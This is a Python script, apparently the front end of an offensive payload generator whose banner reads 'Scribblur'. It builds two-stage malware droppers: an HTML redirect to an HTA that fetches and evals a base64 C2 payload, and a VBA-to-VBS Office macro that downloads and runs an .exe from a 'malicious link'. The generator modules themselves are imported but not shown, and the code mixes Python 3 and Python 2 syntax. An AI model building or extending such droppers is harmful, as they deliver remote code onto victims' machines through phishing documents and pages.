#!/usr/bin/python3

# Default Imports
import sys, os, argparse

# Custom Imports
from Modules.WriteJSPayload import payload_gen
from Modules.WriteHTA import hta_gen
from Modules.WriteRedirect import redirect_gen
from Modules.WriteMacro import macro_gen

# Banner Generated with https://onlineasciitools.com/convert-text-to-ascii-art

parser = argparse.ArgumentParser()
parser.add_argument('-n', help='HTA payload with redirect', dest='Name')
parser.add_argument('-p', help='B64 encoded payload', dest='C2payload')
parser.add_argument('-c', help='Client domain for whois', dest='C2Url')
parser.add_argument('-e', help='Malicious link hosting .exe', dest='EXEUrl')

args = parser.parse_args()

def Banner():
    logo = '''\033[1;31m
.d8888.  .o88b. d8888b. d888888b d8888b. db      db    db d8888b.
88'  YP d8P  Y8 88  `8D   `88'   88  `8D 88      88    88 88  `8D
`8bo.   8P      88oobY'    88    88oooY' 88      88    88 88oobY'
  `Y8b. 8b      88`8b      88    88~~~b. 88      88    88 88`8b
db   8D Y8b  d8 88 `88.   .88.   88   8D 88booo. 88b  d88 88 `88.
`8888Y'  `Y88P' 88   YD Y888888P Y8888P' Y88888P ~Y8888P' 88   YD

\033[0;32;40m*** Work In Progress ***

Payload generation framework for a few  file
formats. Hopefully :P

Current modules, tab to autocomplete:
    HTADropper
    MacroDropper
 '''
    return logo

_Name       = args.Name
_C2Payload  = args.C2payload
_C2Url      = args.C2Url
_EXEUrl     = args.EXEUrl

def check_dir(_Name):
    try:
        directory = './Payloads/'

        if not os.path.isdir(directory):
            os.makedirs(directory)
        else:
            pass
    except Exception, e:
        print("Error encountered... \nReview the following: " + str(e))

def HTADropper(_Name, _C2Payload, _C2Url):
    print("\033[0;32;40m\n[*] You have selected a dual stage HTA paylod...\n")
    print("\033[0;32;40m[*] HTML redirect -> HTA -> Grabs payload.txt -> HTA Evals\n")

    payload_gen(_Name, _C2Payload)
    redirect_gen(_Name, _C2Url)
    hta_gen(_Name, _C2Url)

    print("\n[#] Payloads written successfully...")

def MacroDropper(_Name, _EXEUrl):
    print("\033[0;32;40m[*] You have selected a dualstage .vba subroutine...")
    print ("\033[0;32;40m[*] VBA stage1 -> VBS stage2 -> Downloads .exe and runs...")

    macro_gen(_Name, _EXEUrl)

    print("\n[#] Macro generated successfully...")

def main():
    print(Banner())
    check_dir(_Name)
    if not args.EXEUrl:
        HTADropper(_Name, _C2Payload, _C2Url)
    else:
        MacroDropper(_Name, _EXEUrl)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print('\n \033[1;31m[!] Ctrl + C Detected, Quitting...')
exit(0)
